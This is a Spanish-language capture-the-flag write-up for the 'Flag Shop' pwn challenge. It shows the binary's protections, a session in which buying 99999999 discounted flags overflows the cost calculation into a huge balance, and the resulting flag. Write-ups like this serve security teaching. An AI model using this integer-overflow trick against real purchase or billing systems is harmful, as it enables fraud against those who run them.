# Pwn / Flag Shop

Encontramos un binario con las siguientes propiedades:

``` bash
checksec --file=flagshop 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFYFortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   47 Symbols	  No	01		flagshop
```

Lo abrimos y nos muestra un menú, con tres opciones, con 1 vemos nuestro saldo actual, con 2 compramos banderas, nos interesa obtener la 'Premium Flag' pero es demasiado cara:

``` 
************************************
 Welcome to the Flag Shop v1.0
************************************
[1] View account balance
[2] Purchase items
[3] Exit
Please select an option: 1

Your current balance is: $1500

************************************
 Welcome to the Flag Shop v1.0
************************************
[1] View account balance
[2] Purchase items
[3] Exit
Please select an option: 2
Items for sale:
[1] Discounted Flag - $1200 each
[2] Premium Flag - $200000 (only 1 in stock)
```

Puesto que el programa una vez compras una 'Discounted Flag' hace account_balance = account_balance - 1200 * number_of_discounted_flags, si number_of_discounted_flags es un numero negativo entonces el saldo de nuetra cuenta crecerá. Para explicarlo mejor este es el concepto:

Desbordamiento de enteros (integer overflow): En programación, esto sucede cuando un valor que se asigna a una variable excede el rango máximo que puede representar el tipo de dato de esa variable, provocando que el valor se "desborde" y, en algunos casos, comience de nuevo desde el valor más bajo del rango, lo que puede resultar en números negativos. 

Entonces le pasamos un numero positivo muy grande, number_of_discounted_flags sera negativo y aumentaremos nuestro saldo:

``` bash
 echo "flag{toy_flag}" > flag  # El programa ejecuta 'cat flag' si ganamos, asi que creamos una flag de prueba
```

```
************************************
 Welcome to the Flag Shop v1.0
************************************
[1] View account balance
[2] Purchase items
[3] Exit
Please select an option: 2
Items for sale:
[1] Discounted Flag - $1200 each
[2] Premium Flag - $200000 (only 1 in stock)
1
How many Discounted Flags would you like to purchase?
99999999
Total cost: $-259085488
Purchase successful! Your new balance is: $259086988
************************************
 Welcome to the Flag Shop v1.0
************************************
[1] View account balance
[2] Purchase items
[3] Exit
Please select an option: 2
Items for sale:
[1] Discounted Flag - $1200 each
[2] Premium Flag - $200000 (only 1 in stock)
2
The Premium Flag costs $200000. Do you wish to purchase it? Enter 1 for yes.
1
[+] Congratulations!
Here's your flag: flag{toy_flag}
```

Hacemos lo mismo en el remoto y obtenemos la flag:

`flag{YoU_4r3_a_G00d_Bus1ne5Sm$n}`



